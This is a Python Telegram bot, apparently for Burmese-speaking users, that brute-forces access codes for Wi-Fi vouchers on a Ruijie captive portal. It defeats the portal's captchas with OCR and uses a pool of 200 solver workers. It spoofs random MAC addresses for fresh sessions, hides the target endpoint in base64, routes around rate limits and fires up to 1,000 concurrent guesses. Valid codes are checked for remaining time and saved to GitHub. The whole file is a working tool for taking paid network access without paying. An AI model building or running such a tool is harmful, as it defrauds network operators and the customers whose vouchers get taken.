# ── Fast event loop (Railway Linux = 2× speedup) ──────────────────────────
try:
    import uvloop
    uvloop.install()
    _UV = True
except ImportError:
    _UV = False

# ── Fast JSON ─────────────────────────────────────────────────────────────
try:
    import ujson as json
except ImportError:
    import json

import telebot, asyncio, aiohttp, base64, cv2, ddddocr, logging
import numpy as np, os, random, re, signal, string, time, uuid
from concurrent.futures import ThreadPoolExecutor
from datetime import timezone

from telebot.async_telebot import AsyncTeleBot
from telebot.types         import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp               import web

# ─────────────────────────────────────────────────────────────────────────
# Logging
# ─────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)
logging.getLogger("TeleBot").setLevel(logging.WARNING)

# ─────────────────────────────────────────────────────────────────────────
# Config  ─  Railway Variables tab တွင် ထည့်ပါ (fallback မပေးပါ)
# ─────────────────────────────────────────────────────────────────────────
BOT_TOKEN    = os.environ.get("BOT_TOKEN",    "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
REPO_OWNER   = os.environ.get("REPO_OWNER",   "")
REPO_NAME    = os.environ.get("REPO_NAME",    "")
ADMIN_ID     = os.environ.get("ADMIN_ID",     "")

_miss = [k for k,v in {"BOT_TOKEN":BOT_TOKEN,"GITHUB_TOKEN":GITHUB_TOKEN,
                        "REPO_OWNER":REPO_OWNER,"REPO_NAME":REPO_NAME}.items() if not v]
if _miss:
    raise SystemExit("❌ Railway Variables မထည့်ရသေး:\n" + "\n".join(f"  • {k}" for k in _miss))

# Railway webhook auto-detect
_RD          = (os.environ.get("RAILWAY_PUBLIC_DOMAIN") or
                os.environ.get("RAILWAY_STATIC_URL") or "").strip()
WEBHOOK_PATH = f"/wh{BOT_TOKEN.split(':')[0]}" if _RD else None
WEBHOOK_URL  = f"https://{_RD}{WEBHOOK_PATH}"  if _RD else None

# ─────────────────────────────────────────────────────────────────────────
# Speed constants
# ─────────────────────────────────────────────────────────────────────────
CAPTCHA_SOLVERS     = 200    # background solver workers
MAX_CAPTCHA_REUSE   = 5      # reuse per solved captcha
CAPTCHA_POOL_SIZE   = 1200   # max pool slots
POOL_WARMUP_MIN     = 40     # minimum before scan starts
VOUCHER_CONCURRENCY = 1000   # concurrent voucher POSTs
BATCH_SIZE          = 1000   # codes per batch
OCR_WORKERS         = 32     # OCR thread-pool size

POST_URL = base64.b64decode(
    b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
).decode()

_VHDRS = {
    "authority":    "portal-as.ruijienetworks.com",
    "accept":       "*/*",
    "content-type": "application/json",
    "origin":       "https://portal-as.ruijienetworks.com",
    "user-agent":   "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
}

_BALANCE_PATHS = [
    "https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{}",
    "https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{}",
    "https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{}",
    "https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{}",
]

# ─────────────────────────────────────────────────────────────────────────
# Globals
# ─────────────────────────────────────────────────────────────────────────
SUCCESS_CODE     = asyncio.Queue()
bot              = AsyncTeleBot(BOT_TOKEN)
user_data        = {}
scan_tasks       = {}
success_texts    = {}
limited_texts    = {}
success_messages = {}
limited_messages = {}
notify_setting   = {}
notify_state     = {}
last_scan_params = {}
pending_brute    = {}
session          = None
_connector       = None
_ocr_executor    = None
_start_time      = time.monotonic()

# Per-scan captcha pool
_captcha_pool    = None
_banned_sessions = set()
_filler_task     = None
_voucher_sem     = None

# ─────────────────────────────────────────────────────────────────────────
# Mode info
# ─────────────────────────────────────────────────────────────────────────
MODE_INFO = {
    "1": ("ဂဏန်းသီးသန့် (0-9)",          string.digits,                          10),
    "2": ("အင်္ဂလိပ်အသေး (a-z)",          string.ascii_lowercase,                 26),
    "3": ("အင်္ဂလိပ်အကြီး (A-Z)",          string.ascii_uppercase,                 26),
    "4": ("အကြီး+အသေး (a-zA-Z)",          string.ascii_letters,                   52),
    "5": ("အသေး+ဂဏန်း (a-z, 0-9)",         string.ascii_lowercase + string.digits, 36),
}

PLAN_RE = re.compile(r"^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$", re.IGNORECASE)

def plan_to_minutes(s):
    if not s: return 0
    s = s.strip().lower()
    if s in ("unlimit", "unlimited"): return float("inf")
    total = 0
    for v, u in re.findall(r"(\d+)\s*(mo|min|h|d|m)\b", s):
        v = int(v)
        if   u == "mo":          total += v * 43200
        elif u == "d":           total += v * 1440
        elif u == "h":           total += v * 60
        elif u in ("min", "m"):  total += v
    return total

def parse_length_spec(spec):
    """'6' | '6,7,8' | '6-8' | '6,8-10,12' → sorted list"""
    lengths = set()
    for part in spec.split(","):
        part = part.strip()
        if not part: continue
        if "-" in part:
            a, b = part.split("-", 1)
            a, b = int(a), int(b)
            if a > b: a, b = b, a
            for i in range(a, b+1): lengths.add(i)
        else:
            lengths.add(int(part))
    result = sorted(lengths)
    if not result: raise ValueError("Length spec empty")
    for L in result:
        if not 1 <= L <= 20:
            raise ValueError(f"Length {L} သည် 1-20 အတွင်း ဖြစ်ရပါမည်")
    return result

def iter_codes(mode, length):
    mode, length = str(mode), int(length)
    if mode not in MODE_INFO:
        raise ValueError(f"Mode 1-5 ဖြစ်ရမည် (got {mode})")
    _, chars, _ = MODE_INFO[mode]
    if mode == "1" and length <= 6:
        order = list(range(10**length)); random.shuffle(order)
        for i in order: yield str(i).zfill(length)
        return
    while True:
        yield "".join(random.choices(chars, k=length))

def universe_size(mode, length):
    if mode == "1" and length <= 6: return 10**length
    return None

def format_progress(checked, total=None, speed=0, found=0, target=None,
                    current_length=None, lengths=None, pool_sz=0):
    lines = ["📋 Status: Running"]
    if current_length is not None and lengths and len(lengths) > 1:
        idx = (lengths.index(current_length) + 1) if current_length in lengths else "?"
        lines.append(f"📏 Length: {current_length} ({idx}/{len(lengths)})")
    elif current_length:
        lines.append(f"📏 Length: {current_length}")
    lines.append(f"⚡ Speed: {speed:,.0f}/min")
    lines.append(f"🔍 Checked: {checked:,}")
    lines.append(f"💎 Found: {found}")
    if target: lines.append(f"🎯 Target: {found}/{target}")
    lines.append(f"🎯 Pool: {pool_sz}")
    return "\n".join(lines)

# ─────────────────────────────────────────────────────────────────────────
# Helper: send long text in chunks
# ─────────────────────────────────────────────────────────────────────────
async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to=None):
    MAX = 4096
    if len(text) <= MAX:
        await bot.send_message(chat_id, text, parse_mode=parse_mode,
                               reply_to_message_id=reply_to)
        return
    lines = text.split("\n"); chunk = ""; first = True
    for line in lines:
        cand = chunk + ("\n" if chunk else "") + line
        if len(cand) > MAX:
            if chunk:
                await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                                       reply_to_message_id=reply_to if first else None)
                first = False
            chunk = line
        else:
            chunk = cand
    if chunk:
        await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                               reply_to_message_id=reply_to if first else None)

# ─────────────────────────────────────────────────────────────────────────
# Web server  ─  health check + webhook
# ─────────────────────────────────────────────────────────────────────────
async def handle(req):
    up = int(time.monotonic() - _start_time); h,r = divmod(up,3600); m = r//60
    pool = _captcha_pool.qsize() if _captcha_pool else 0
    return web.Response(
        text=f"✅ up {h}h{m}m | pool {pool} | uvloop {'ON' if _UV else 'off'}"
    )

async def on_webhook(req):
    try:
        upd = telebot.types.Update.de_json(await req.json())
        asyncio.create_task(bot.process_new_updates([upd]))
    except Exception as e:
        log.warning(f"webhook: {e}")
    return web.Response(text="OK")

async def web_server():
    app = web.Application()
    app.router.add_get("/", handle)
    if WEBHOOK_PATH:
        app.router.add_post(WEBHOOK_PATH, on_webhook)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", os.environ.get("BOT_PORT", 8099)))
    await web.TCPSite(runner, "0.0.0.0", port).start()
    log.info(f"web :{port} | webhook={'ON' if WEBHOOK_PATH else 'polling'} | uvloop={_UV}")

# ─────────────────────────────────────────────────────────────────────────
# GitHub helpers
# ─────────────────────────────────────────────────────────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    async with session.get(url, headers={"Authorization": f"token {GITHUB_TOKEN}"}) as r:
        if r.status == 200:
            d = await r.json(content_type=None)
            return json.loads(base64.b64decode(d["content"]).decode()), d["sha"]
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    hdrs = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
    enc  = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {"message": message, "content": enc}
    if sha: payload["sha"] = sha
    async with session.put(url, headers=hdrs, json=payload) as r:
        txt = await r.text()
        if r.status not in (200, 201):
            raise RuntimeError(f"GitHub PUT failed [{r.status}]: {txt[:300]}")
        return txt

async def update_file_retry(path, content, sha, message, retries=2):
    for attempt in range(retries + 1):
        try:
            return await update_file_content(path, content, sha, message)
        except RuntimeError as e:
            if "409" in str(e) and attempt < retries:
                _, sha = await get_file_content(path); continue
            raise

# ─────────────────────────────────────────────────────────────────────────
# Session / Captcha  (confirmed-working Ruijie logic)
# ─────────────────────────────────────────────────────────────────────────
def get_mac():
    fb = random.choice([0x02,0x06,0x0A,0x0E])
    return ":".join(f"{x:02x}" for x in [fb]+[random.randint(0,0xFF) for _ in range(5)])

def replace_mac(url, mac):
    return re.sub(r"(?<=mac=)[^&]+", mac, url)

async def get_session_id(sess, session_url, prev=None):
    url = replace_mac(session_url, get_mac())
    hdrs = {
        "accept":     "text/html,application/xhtml+xml,*/*;q=0.8",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "cookie":     "sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152%22%7D",
    }
    try:
        async with sess.get(url, headers=hdrs, allow_redirects=True,
                            timeout=aiohttp.ClientTimeout(total=12)) as r:
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return m.group(1) if m else prev
    except Exception: return prev

# ─────────────────────────────────────────────────────────────────────────
# OCR  ─  improved preprocessing + thread pool
# ─────────────────────────────────────────────────────────────────────────
_ocr_engine = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(raw: bytes):
    arr = np.frombuffer(raw, np.uint8)
    img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
    if img is None: return None
    img  = cv2.resize(img, None, fx=2, fy=2, interpolation=cv2.INTER_CUBIC)
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    gray = cv2.fastNlMeansDenoising(gray, h=10)
    gray = cv2.filter2D(gray, -1, np.array([[0,-1,0],[-1,5,-1],[0,-1,0]]))
    _, th = cv2.threshold(cv2.GaussianBlur(gray,(3,3),0), 0, 255,
                          cv2.THRESH_BINARY+cv2.THRESH_OTSU)
    th = cv2.morphologyEx(th, cv2.MORPH_CLOSE,
                          cv2.getStructuringElement(cv2.MORPH_RECT,(2,2)))
    _, bf = cv2.imencode(".png", th)
    return _ocr_engine.classification(bf.tobytes()).upper()

async def Captcha_Text(raw: bytes):
    return await asyncio.get_event_loop().run_in_executor(_ocr_executor, _ocr_sync, raw)

async def Captcha_Image(sess, sid: str) -> bytes:
    hdrs = {"authority":"portal-as.ruijienetworks.com","accept":"image/*,*/*;q=0.8",
            "user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    async with sess.get("https://portal-as.ruijienetworks.com/api/auth/captcha/image",
                        params={"sessionId": sid, "_t": str(time.time())},
                        headers=hdrs, timeout=aiohttp.ClientTimeout(total=8)) as r:
        return await r.read()

async def Varify_Captcha(sess, sid: str, text: str) -> bool:
    hdrs = {"authority":"portal-as.ruijienetworks.com","accept":"*/*",
            "content-type":"application/json","origin":"https://portal-as.ruijienetworks.com",
            "user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    async with sess.post("https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
                         headers=hdrs,
                         json={"sessionId": sid, "authCode": text},
                         timeout=aiohttp.ClientTimeout(total=8)) as r:
        try: d = await r.json(content_type=None)
        except Exception: d = {}
        return bool(d.get("success"))

async def check_session_url(session_url: str) -> bool:
    # Quick check: Ruijie portal indicators in URL
    for kw in ["portal-as.ruijienetworks.com", "maccauth", "ruijienetworks"]:
        if kw in session_url: return True
    # HTTP fallback check
    try:
        async with session.get(session_url, allow_redirects=True,
                               timeout=aiohttp.ClientTimeout(total=12)) as r:
            final = str(r.url); body = await r.text()
            for kw in ["sessionId","portal-as.ruijienetworks","maccauth","captcha","lang=en_US"]:
                if kw in final or kw in body: return True
    except Exception: pass
    return False

# ─────────────────────────────────────────────────────────────────────────
# Balance checker
# ─────────────────────────────────────────────────────────────────────────
def _fmt_sec(v):
    s = int(v); h,r = divmod(s,3600); m = r//60
    return f"{h}h {m}m" if h else (f"{m}m" if m else f"{s}s")

def _fmt_min(v):
    t = int(v)
    if t <= 0: return "0m"
    if t < 60: return f"{t}m"
    h, m = divmod(t, 60)
    if h < 24: return f"{h}h {m}m" if m else f"{h}h"
    d, rh = divmod(h, 24)
    if d < 30: return f"{d}d {rh}h" if rh else f"{d}d"
    mo, rd = divmod(d, 30)
    return f"{mo}mo {rd}d" if rd else f"{mo}mo"

async def get_balance(session_id: str) -> str:
    if not session_id: return "N/A"
    hdrs = {"authority":"portal-as.ruijienetworks.com",
            "accept":"application/json, text/javascript, */*; q=0.01",
            "user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "x-requested-with":"XMLHttpRequest"}
    for url in _BALANCE_PATHS:
        try:
            async with session.get(url.format(session_id), headers=hdrs,
                                   timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status != 200: continue
                d = await r.json(content_type=None)
                if not d.get("success"): continue
                res = d.get("result", {})
                for k in ("totalMinutes","remainingMinutes","remainMinutes","leftMinutes","balance","remaining"):
                    if res.get(k) is not None: return _fmt_min(res[k])
                for k in ("remainingSeconds","remainTime","remainingTime","leftTime","timeLeft"):
                    if res.get(k) is not None: return _fmt_sec(res[k])
        except Exception: continue
    return "N/A"

# ─────────────────────────────────────────────────────────────────────────
# Captcha Pool  ─  200 background solvers × 5 reuse
# ─────────────────────────────────────────────────────────────────────────
async def _solve_one(pool, session_url: str):
    try:
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(), timeout=aiohttp.ClientTimeout(total=15)
        ) as ts:
            sid = await get_session_id(ts, session_url)
            if not sid: return
            for _ in range(8):
                try:
                    img = await Captcha_Image(ts, sid)
                    if not img: continue
                    txt = await Captcha_Text(img)
                    if not txt: continue
                    if await Varify_Captcha(ts, sid, txt):
                        for _ in range(MAX_CAPTCHA_REUSE):
                            try: pool.put_nowait((sid, txt))
                            except asyncio.QueueFull: return
                        return
                except Exception: continue
    except Exception: pass

async def _fill_pool(pool, session_url, scan_id, chat_id):
    sem = asyncio.Semaphore(CAPTCHA_SOLVERS)
    async def _one():
        async with sem: await _solve_one(pool, session_url)
    while True:
        cur = scan_tasks.get(chat_id)
        if not cur or cur.get("scan_id") != scan_id or cur.get("stop"): return
        needed = (CAPTCHA_POOL_SIZE - pool.qsize()) // MAX_CAPTCHA_REUSE
        if needed > 0:
            await asyncio.gather(
                *[asyncio.create_task(_one()) for _ in range(min(needed, CAPTCHA_SOLVERS))],
                return_exceptions=True
            )
        else:
            await asyncio.sleep(0.02)

async def _get_token(pool, timeout=10.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        rem = deadline - time.monotonic()
        try:
            sid, code = await asyncio.wait_for(pool.get(), timeout=min(rem, 1.0))
            if sid not in _banned_sessions: return sid, code
        except asyncio.TimeoutError: break
    return None, None

async def _solve_demand(session_url):
    async with aiohttp.ClientSession(
        connector=_connector, connector_owner=False,
        cookie_jar=aiohttp.CookieJar(), timeout=aiohttp.ClientTimeout(total=20)
    ) as ts:
        sid = await get_session_id(ts, session_url)
        if not sid: return None, None
        for _ in range(8):
            try:
                img = await Captcha_Image(ts, sid)
                txt = await Captcha_Text(img)
                if txt and await Varify_Captcha(ts, sid, txt): return sid, txt
            except Exception: continue
    return None, None

# ─────────────────────────────────────────────────────────────────────────
# Core voucher check  ─  1 HTTP request per code (pool-based)
# ─────────────────────────────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None,
                        recheck=False, message=None, plan_filters=None):
    if not recheck:
        cur = scan_tasks.get(chat_id)
        if not cur or cur.get("scan_id") != scan_id: return None

    sid, auth = (await _solve_demand(session_url)) if recheck else (await _get_token(_captcha_pool))
    if not sid: return None

    # Single POST using global session
    try:
        async with session.post(
            POST_URL,
            json={"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth},
            headers=_VHDRS, timeout=aiohttp.ClientTimeout(total=12),
        ) as req:
            resp = await req.text()
    except Exception: return None

    if not resp: return None

    if "request limited" in resp:
        _banned_sessions.add(sid); return None

    if "logonUrl" in resp:
        if recheck: return code
        plan_str = "N/A"
        try:
            fetched = await get_balance(sid)
            if fetched not in ("N/A", "Error"): plan_str = fetched
        except Exception: pass
        if plan_filters:
            mins = plan_to_minutes(plan_str)
            if not any(mins >= plan_to_minutes(f) for f in plan_filters): return None
        success_texts.setdefault(chat_id, []).append({"code": code, "session_id": sid, "plan": plan_str})
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code, "session_id": sid, "plan": plan_str})
        # Notify
        if notify_setting.get(chat_id, False) and message:
            try:
                items = success_texts[chat_id]; n = len(items)
                pages = notify_state.get(chat_id) or []
                MAX = 4096
                def build(first_idx):
                    hdr = f"✅ Success Codes ({n}):\n" if first_idx==0 else f"✅ cont. ({first_idx+1}-{n}):\n"
                    return hdr + "\n".join(f"`{i['code']}` – ⏳ {i.get('plan','N/A')}" for i in items[first_idx:])
                if not pages:
                    txt = build(0)
                    sent = await bot.send_message(chat_id, txt, parse_mode="Markdown")
                    notify_state[chat_id] = [{"msg_id": sent.message_id, "first_idx": 0}]
                else:
                    lp = pages[-1]; new_txt = build(lp["first_idx"])
                    if len(new_txt) <= MAX:
                        try:
                            await bot.edit_message_text(chat_id=chat_id, message_id=lp["msg_id"],
                                                        text=new_txt, parse_mode="Markdown")
                        except Exception:
                            sent = await bot.send_message(chat_id, new_txt, parse_mode="Markdown")
                            pages[-1] = {"msg_id": sent.message_id, "first_idx": lp["first_idx"]}
                    else:
                        t2 = f"✅ cont. ({n}):\n`{code}` – ⏳ {plan_str}"
                        sent = await bot.send_message(chat_id, t2, parse_mode="Markdown")
                        pages.append({"msg_id": sent.message_id, "first_idx": n-1})
                    notify_state[chat_id] = pages
            except Exception as e: log.debug(f"notify: {e}")
        return code

    if "STA" in resp:
        limited_texts.setdefault(chat_id, []).append(code)
        if notify_setting.get(chat_id, False) and message:
            line = "\n".join(limited_texts[chat_id][-30:])
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(chat_id=chat_id, message_id=limited_messages[chat_id],
                                                    text=f"⚠️ Limited Codes:\n{line}")
                    except Exception:
                        sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{line}")
                        limited_messages[chat_id] = sent.message_id
            except Exception: pass
    return None

# ─────────────────────────────────────────────────────────────────────────
# Brute-force runner
# ─────────────────────────────────────────────────────────────────────────
async def run_bruteforce(mode, lengths, chat_id, session_url, scan_id,
                         target=None, message=None, progress_msg=None, plan_filters=None):
    global _captcha_pool, _banned_sessions, _filler_task, _voucher_sem

    _captcha_pool    = asyncio.Queue(maxsize=CAPTCHA_POOL_SIZE)
    _banned_sessions = set()
    _filler_task     = asyncio.create_task(_fill_pool(_captcha_pool, session_url, scan_id, chat_id))

    for _ in range(POOL_WARMUP_MIN * 12):
        if _captcha_pool.qsize() >= POOL_WARMUP_MIN: break
        await asyncio.sleep(0.1)
    try:
        await bot.edit_message_text(
            format_progress(0, pool_sz=_captcha_pool.qsize()), chat_id, progress_msg.message_id
        )
    except Exception: pass

    _voucher_sem = asyncio.Semaphore(VOUCHER_CONCURRENCY)
    checked = 0; found = 0; scan_start = time.monotonic(); t_last = 0.0

    log.info(f"scan start | mode={mode} lengths={lengths} | chat={chat_id}")

    try:
        for li, length in enumerate(lengths):
            try:
                code_iter = iter_codes(mode, length)
            except ValueError as e:
                await bot.send_message(chat_id, str(e)); return
            total = universe_size(mode, length)

            while True:
                cur = scan_tasks.get(chat_id)
                if not cur or cur.get("scan_id") != scan_id: return
                if cur.get("stop"):
                    last_scan_params[chat_id] = {
                        "mode": mode, "lengths": lengths[li:],
                        "target": target, "plan_filters": plan_filters or []
                    }
                    scan_tasks.pop(chat_id, None); return

                batch = []
                for _ in range(BATCH_SIZE):
                    try: batch.append(next(code_iter))
                    except StopIteration: break
                if not batch: break

                async def _chk(c):
                    async with _voucher_sem:
                        return await perform_check(session_url, c, chat_id, scan_id,
                                                   message=message, plan_filters=plan_filters)

                results = await asyncio.gather(*[_chk(c) for c in batch], return_exceptions=True)
                for res in results:
                    if isinstance(res, str):
                        found += 1
                        if target and found >= target:
                            try:
                                await bot.edit_message_text("🎯 Target ရောက်ပြီ! Scan ရပ်ပါပြီ။",
                                                            chat_id, progress_msg.message_id)
                            except Exception: pass
                            scan_tasks.pop(chat_id, None)
                            last_scan_params.pop(chat_id, None)
                            return

                checked += len(batch)
                now = time.monotonic()
                if now - t_last >= 3.0:
                    t_last = now; el = now - scan_start
                    speed = checked / el * 60 if el > 0 else 0
                    txt = format_progress(checked, total, speed, found, target,
                                          length, lengths, _captcha_pool.qsize())
                    try:
                        await bot.edit_message_text(txt, chat_id, progress_msg.message_id)
                    except Exception:
                        try:
                            nm = await bot.send_message(chat_id, txt)
                            progress_msg.message_id = nm.message_id
                        except Exception: pass

                if checked % 30000 < BATCH_SIZE:
                    el = time.monotonic()-scan_start
                    log.info(f"speed={checked/el*60:,.0f}/min | checked={checked:,} | "
                             f"found={found} | pool={_captcha_pool.qsize()} | banned={len(_banned_sessions)}")

        finish = (f"✅ Scan ပြီးပါပြီ\n\n"
                  f"📦 Checked : {checked:,}\n✅ Found : {found}")
        try:
            await bot.edit_message_text(finish, chat_id, progress_msg.message_id)
        except Exception:
            await bot.send_message(chat_id, finish)
        scan_tasks.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)

    except asyncio.CancelledError: pass
    except Exception as e: log.error(f"run_bruteforce: {e}")
    finally:
        if _filler_task and not _filler_task.done():
            _filler_task.cancel()
            try: await _filler_task
            except asyncio.CancelledError: pass
        _captcha_pool = None
        scan_tasks.pop(chat_id, None)

# ─────────────────────────────────────────────────────────────────────────
# Usage text
# ─────────────────────────────────────────────────────────────────────────
USAGE = (
    "📖 **Voucher Bot အသုံးပြုနည်း**\n\n"
    "**၁။ Setup:**\n`/setup <url>`\n\n"
    "**၂။ ရှာဖွေခြင်း:**\n"
    "`/brute <mode> <lengths> [target] [plan]`\n\n"
    "*Mode:*\n"
    "  `1` = ဂဏန်း (0-9)\n"
    "  `2` = အသေး (a-z)\n"
    "  `3` = အကြီး (A-Z)\n"
    "  `4` = အကြီး+အသေး (a-zA-Z)\n"
    "  `5` = အသေး+ဂဏန်း (a-z, 0-9)\n\n"
    "*Lengths:*\n"
    "  `6` → တစ်ခုတည်း\n"
    "  `6,7,8` → သုံးခု\n"
    "  `6-8` → range\n"
    "  `6,8-10,12` → mixed\n\n"
    "*ဥပမာ:*\n"
    "  `/brute 1 6 5` → ဂဏန်း ၆လုံး, ၅ ခု\n"
    "  `/brute 1 4-8 10` → ဂဏန်း ၄-၈လုံး, ၁၀ ခု\n"
    "  `/brute 5 6 5 1d` → alnum ၆လုံး, ၁ ရက်ကျော် ၅ ခု\n"
    "  `/brute 2 6 1d 1mo` → lowercase ၆လုံး, ၁ ရက်/၁ လ\n\n"
    "**Commands:**\n"
    "`/status` `/stop` `/resume` `/saved` `/delete_saved` `/recheck` `/notify`"
)

# ─────────────────────────────────────────────────────────────────────────
# Bot commands
# ─────────────────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
async def cmd_start(m):
    await bot.reply_to(m, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")

@bot.message_handler(commands=["help"])
async def cmd_help(m):
    await bot.reply_to(m, USAGE, parse_mode="Markdown")

@bot.message_handler(commands=["setup"])
async def cmd_setup(m):
    args = m.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(m, "အသုံးပြုနည်း:\n/setup your_session_url"); return
    url = args[1].strip()
    pm  = await bot.reply_to(m, "Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        cid = m.chat.id
        if cid in scan_tasks:
            t = scan_tasks.pop(cid, None)
            if t and t.get("task"): t["task"].cancel()
        user_data.setdefault(cid, {})["session_url"] = url
        for d in (success_texts, limited_texts, last_scan_params, pending_brute,
                  success_messages, limited_messages, notify_state):
            d.pop(cid, None)
        try:
            results, sha = await get_file_content("result.json")
            if str(cid) in results:
                del results[str(cid)]
                await update_file_retry("result.json", results, sha, f"Clear {cid}")
        except Exception as e: log.warning(f"setup clear: {e}")
        await bot.edit_message_text("✅ Session URL သိမ်းပြီး!\n/brute ဖြင့် စတင်ပါ",
                                    m.chat.id, pm.message_id)
    else:
        await bot.edit_message_text("❌ Session URL မမှန်ပါ။ ပြန်စစ်ပြီး ထပ်ကြိုးပါ",
                                    m.chat.id, pm.message_id)

@bot.message_handler(commands=["brute"])
async def cmd_brute(m):
    args = m.text.split()
    if len(args) < 3:
        await bot.reply_to(m, USAGE, parse_mode="Markdown"); return
    mode = args[1]
    if mode not in MODE_INFO:
        await bot.reply_to(m, "❌ Mode 1-5 ဖြစ်ရမည်"); return
    try:
        lengths = parse_length_spec(args[2])
    except ValueError as e:
        await bot.reply_to(m, f"❌ Length spec: {e}"); return
    target = None; plan_filters = []; idx = 3
    if idx < len(args) and not PLAN_RE.match(args[idx]):
        try: target = int(args[idx]); idx += 1
        except ValueError:
            await bot.reply_to(m, "❌ Target ဂဏန်းဖြစ်ရမည်"); return
    for a in args[idx:]:
        if PLAN_RE.match(a): plan_filters.append(a)
        else:
            await bot.reply_to(m, f"❌ '{a}' plan ပုံစံမမှန်\nဥပမာ: 30min 2h 1d 1mo unlimit"); return
    cid = m.chat.id
    if cid not in user_data or "session_url" not in user_data[cid]:
        await bot.reply_to(m, "/setup ဖြင့် Session URL ထည့်ပါ"); return
    if cid in last_scan_params:
        mk = InlineKeyboardMarkup()
        mk.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
               InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[cid] = {"mode":mode,"lengths":lengths,"target":target,"plan_filters":plan_filters}
        prev = last_scan_params[cid]
        await bot.reply_to(m,
            f"ယခင် scan ရပ်ထားသည် (mode: {prev.get('mode','?')}, "
            f"lengths: {prev.get('lengths','?')}, target: {prev.get('target')})\n"
            "ပြန်စမလား၊ အသစ်စမလား?", reply_markup=mk)
        return
    await _launch(cid, mode, lengths, target, m, plan_filters)

async def _launch(cid, mode, lengths, target, orig, plan_filters=None):
    plan_filters = plan_filters or []
    label  = MODE_INFO[mode][0]
    lenstr = ",".join(map(str, lengths))
    pf     = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
    prog   = await bot.send_message(cid, f"Preparing... Mode {mode} ({label}), Lengths [{lenstr}]{pf}")
    sid    = str(uuid.uuid4())
    task   = asyncio.create_task(
        run_bruteforce(mode, lengths, cid, user_data[cid]["session_url"],
                       sid, target, orig, prog, plan_filters)
    )
    scan_tasks[cid] = {"task": task, "stop": False, "scan_id": sid}
    success_messages.pop(cid, None); limited_messages.pop(cid, None)

@bot.message_handler(commands=["stop"])
async def cmd_stop(m):
    cid  = m.chat.id; data = scan_tasks.get(cid)
    if data and not data["task"].done():
        data["stop"] = True; data["task"].cancel()
        scan_tasks.pop(cid, None)
        await bot.reply_to(m, "Scan ရပ်ထားပါသည်။ /resume ဖြင့် ပြန်စနိုင်ပါသည်")
    else:
        await bot.reply_to(m, "ရပ်ရန် scan မရှိပါ")

@bot.message_handler(commands=["resume"])
async def cmd_resume(m):
    cid = m.chat.id
    if cid not in last_scan_params:
        await bot.reply_to(m, "ယခင်ရပ်ထားသော scan မရှိပါ"); return
    p = last_scan_params.pop(cid)
    ls = p.get("lengths") or [p.get("length", 6)]
    await _launch(cid, p["mode"], ls, p["target"], m, p.get("plan_filters", []))
    await bot.reply_to(m, "ယခင် scan ပြန်စပါပြီ")

@bot.callback_query_handler(func=lambda c: c.data in ("resume_scan", "new_scan"))
async def on_resume_cb(call):
    cid = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if cid not in last_scan_params:
            await bot.edit_message_text("Resume scan မရှိပါ", cid, call.message.message_id); return
        p = last_scan_params.pop(cid)
        ls = p.get("lengths") or [p.get("length", 6)]
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ", cid, call.message.message_id)
        await _launch(cid, p["mode"], ls, p["target"], call.message, p.get("plan_filters", []))
    else:
        p = pending_brute.pop(cid, None); last_scan_params.pop(cid, None)
